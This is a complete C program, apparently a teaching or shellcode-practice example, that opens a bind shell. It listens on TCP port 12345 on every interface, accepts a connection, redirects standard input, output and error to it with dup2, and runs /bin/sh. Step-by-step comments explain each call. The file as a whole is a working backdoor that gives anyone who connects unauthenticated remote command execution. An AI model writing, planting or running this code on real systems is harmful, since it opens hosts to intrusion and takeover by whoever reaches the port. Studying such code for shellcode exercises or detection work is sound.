#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 12345

int main()
{
  struct sockaddr_in addr;
  int fd, connfd;

  //create socket fd
  fd = socket(AF_INET, SOCK_STREAM, 0);
  addr.sin_port = htons(PORT); //set port to 12345
  addr.sin_addr.s_addr = 0;
  addr.sin_addr.s_addr = INADDR_ANY; //set socket to listen on any interfaces
  addr.sin_family = AF_INET;

  //bind socket and listen for connections
  bind(fd,(struct sockaddr *)&addr,sizeof(struct sockaddr_in));
  listen(fd, 0);

  //accept connections on socket, set addr and addrlen arguments to NULL since we are not using them
  connfd = accept(fd, NULL, NULL);

  //duplicate file descriptors using dup2, which will feed stdin, stdout and stderr to connected client in shell
  dup2(connfd, 0);
  dup2(connfd, 1);
  dup2(connfd, 2);

  //finally create shell for connected client
  execve("/bin/sh", NULL, NULL);

  //close socket and return
  close(fd);
  return 0;
}
